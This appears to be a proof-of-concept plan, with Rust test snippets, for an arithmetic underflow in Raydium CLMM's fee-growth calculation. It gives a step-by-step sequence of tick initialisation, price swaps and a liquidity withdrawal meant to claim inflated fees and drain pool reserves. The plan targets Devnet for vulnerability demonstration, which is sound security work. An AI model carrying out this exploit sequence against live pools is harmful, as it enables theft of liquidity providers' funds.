# Detailed POC Implementation Plan for Raydium CLMM Fee Growth Vulnerability

## Overview

This document provides a comprehensive, step-by-step plan to implement a proof of concept (POC) that demonstrates the fee growth wrapping vulnerability in Raydium CLMM on Devnet.

## Technical Requirements & Limitations

### Tick Array Structure
- **TICK_ARRAY_SIZE**: 60 ticks per array
- **Tick Spacing**: Configurable (e.g., 10 for 0.3% fee pools)
- **Tick Array Start Index**: Must be aligned to `tick_spacing * TICK_ARRAY_SIZE`
- **Example**: For tick spacing 10, tick arrays start at -600, 0, 600, etc.

### Position Requirements
- Positions must have `tick_lower < tick_upper`
- Both ticks must be divisible by tick spacing
- Ticks are initialized when first used by a position
- Fee growth outside values are set at initialization based on current tick

### Vulnerability Conditions
1. `tick_lower.fee_growth_outside + tick_upper.fee_growth_outside > fee_growth_global`
2. Current tick must be between tick_lower and tick_upper
3. The calculation `global - below - above` must underflow

## Detailed POC Steps

### Phase 1: Environment Setup

```rust
// 1. Initialize test environment
let wallet = Keypair::new();
let program_test = ProgramTest::new("raydium_amm_v3", raydium_amm_v3::id(), processor);
let setup = test_utils::setup(&mut program_test, &wallet.pubkey(), 10, 3000); // 10 tick spacing, 0.3% fee

// 2. Create pool at tick 0
let create_pool_ix = test_utils::create_pool_ix(&setup, wallet.pubkey(), 0);
// Execute transaction...

// 3. Create base liquidity position [-500, 500]
// This provides liquidity for fee generation
let base_position = open_position(-500, 500, 1_000_000_000);
```

### Phase 2: Tick Manipulation Strategy

#### Step 1: Generate Initial Fees (G₁)
```rust
// Current state: tick = 0, fee_growth_global = 0
// Swap to tick -10 to generate fees
swap(amount: 100_000_000, zero_for_one: true, target_tick: -10);
// Result: fee_growth_global = G₁ (e.g., 100)
```

#### Step 2: Initialize Lower Tick
```rust
// While current tick = -10, create position [-100, 50]
// This initializes tick -100 with fee_growth_outside = G₁
open_position(-100, 50, 100_000_000);
// tick_lower.fee_growth_outside = G₁ (because -100 ≤ -10)
```

#### Step 3: Generate More Fees and Move Price
```rust
// Perform multiple swaps to:
// 1. Increase fee_growth_global
// 2. Move price above tick 100

for i in 0..5 {
    // Buy (move price up)
    swap(amount: 500_000_000, zero_for_one: false, target_tick: 30 + i*20);
    // Sell (move price down slightly to generate more fees)
    swap(amount: 200_000_000, zero_for_one: true, target_tick: 25 + i*20);
}

// Final swap to position at tick 150
swap(amount: 1_000_000_000, zero_for_one: false, target_tick: 150);
// Result: fee_growth_global = G₂ (e.g., 500)
```

#### Step 4: Initialize Upper Tick
```rust
// While current tick = 150, create position [100, 200]
// This initializes tick 100 with fee_growth_outside = G₂
open_position(100, 200, 100_000_000);
// tick_upper.fee_growth_outside = G₂ (because 100 < 150)
```

### Phase 3: Exploit Execution

#### Step 1: Create Exploit Position
```rust
// Create position at [-100, 100]
let exploit_position = open_position(-100, 100, 1_000_000_000);
// At this point, fee_growth_inside calculation is still normal
// because current tick (150) is outside the range
```

#### Step 2: Trigger Vulnerability
```rust
// Move price back inside the position range
swap(amount: 2_000_000_000, zero_for_one: true, target_tick: 50);

// Now the vulnerable calculation occurs:
// fee_growth_below = tick_lower.fee_growth_outside = G₁
// fee_growth_above = tick_upper.fee_growth_outside = G₂
// fee_growth_inside = G₂ - G₁ - G₂ = -G₁
// With wrapping_sub: fee_growth_inside ≈ u128::MAX
```

#### Step 3: Accumulate Overflow Fees
```rust
// Perform small swaps to accumulate fees with the overflow multiplier
for i in 0..3 {
    swap(amount: 100_000_000, zero_for_one: false, target_tick: 60);
    swap(amount: 100_000_000, zero_for_one: true, target_tick: 40);
}
```

#### Step 4: Claim Overflow Fees
```rust
// Decrease liquidity to trigger fee calculation and payout
decrease_liquidity(
    position: exploit_position,
    liquidity_delta: position.liquidity / 2,
    amount_0_min: 0,
    amount_1_min: 0
);

// The overflow fee_growth_inside is multiplied by liquidity
// Results in massive fee payout attempt
```

## Critical Implementation Details

### 1. Tick Array Management
```rust
// Calculate tick array start indices
fn get_tick_array_start_index(tick: i32, tick_spacing: i32) -> i32 {
    let arrays_per_positive = tick / (tick_spacing * TICK_ARRAY_SIZE);
    let arrays_per_negative = if tick < 0 && tick % (tick_spacing * TICK_ARRAY_SIZE) != 0 {
        arrays_per_positive - 1
    } else {
        arrays_per_positive
    };
    arrays_per_negative * tick_spacing * TICK_ARRAY_SIZE
}

// Required tick arrays for the exploit:
let tick_array_indices = vec![
    get_tick_array_start_index(-500, 10), // For base position
    get_tick_array_start_index(-100, 10), // For lower tick
    get_tick_array_start_index(100, 10),  // For upper tick
    get_tick_array_start_index(0, 10),    // For swaps around 0
];
```

### 2. Swap Direction and Price Limits
```rust
// Use sqrt price limits to control tick movement
let sqrt_price_at_tick = |tick: i32| -> u128 {
    raydium_amm_v3::libraries::get_sqrt_price_at_tick(tick).unwrap()
};

// Swap parameters
SwapParams {
    amount: swap_amount,
    other_amount_threshold: 0, // No slippage protection needed for POC
    sqrt_price_limit_x64: sqrt_price_at_tick(target_tick),
    is_base_input: true,
}
```

### 3. Position NFT Management
```rust
// Each position requires a unique NFT mint
let position_nft_mint = Keypair::new();

// Personal position PDA derivation
let (personal_position_pda, _) = Pubkey::find_program_address(
    &[
        b"position",
        position_nft_mint.pubkey().as_ref(),
    ],
    &program_id,
);
```

### 4. Account Requirements
Each instruction requires specific accounts:
- **Open Position**: 10 accounts including tick arrays
- **Swap**: 8+ accounts including relevant tick arrays
- **Decrease Liquidity**: 13 accounts including vault token accounts

## Expected Results

### Successful Exploit Indicators
1. **Overflow Detection**: Fee growth inside calculation produces values near u128::MAX
2. **Abnormal Fee Claims**: Fees claimed exceed reasonable bounds (>1000x expected)
3. **Pool Drainage**: Significant portion of pool reserves transferred

### Potential Mitigations Encountered
1. **Overflow Panics**: Some checked arithmetic may cause transaction failures
2. **Partial Protection**: Protocol position uses saturating_sub
3. **Balance Checks**: Insufficient vault balance may limit payout

## Testing Recommendations

### 1. Parameter Variations
- Try different tick spacings (1, 10, 60)
- Vary liquidity amounts
- Test with different fee tiers

### 2. Edge Cases
- Test with maximum tick values
- Test with minimum liquidity
- Test rapid tick crossings

### 3. Monitoring
- Log all fee growth values at each step
- Track tick initialization states
- Monitor vault balances

## Conclusion

This POC plan provides a complete blueprint for demonstrating the fee growth wrapping vulnerability. The exploit requires only standard user operations and can potentially drain pool reserves through overflow fee calculations. The implementation should follow the exact sequence outlined to ensure proper tick initialization and fee growth manipulation.